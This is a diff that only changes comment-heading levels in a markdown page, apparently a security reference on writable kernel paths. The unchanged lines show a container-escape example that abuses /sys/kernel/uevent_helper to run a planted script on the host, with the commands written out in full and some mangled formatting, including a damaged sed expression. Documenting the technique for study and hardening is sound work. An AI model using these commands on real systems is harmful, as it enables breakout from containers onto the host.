@@ -138,23 +138,23 @@ This directory permits access to modify kernel variables, usually via `sysctl(2)
 * Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.
 *   **Example for Exploitation**: %%%bash
 
-    ### Creates a payload
+    #### Creates a payload
 
     echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-    ### Finds host path from OverlayFS mount for container
+    #### Finds host path from OverlayFS mount for container
 
     host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-    ### Sets uevent\_helper to malicious helper
+    #### Sets uevent\_helper to malicious helper
 
     echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-    ### Triggers a uevent
+    #### Triggers a uevent
 
     echo change > /sys/class/mem/null/uevent
 
-    ### Reads the output
+    #### Reads the output
 
     cat /output %%%
 
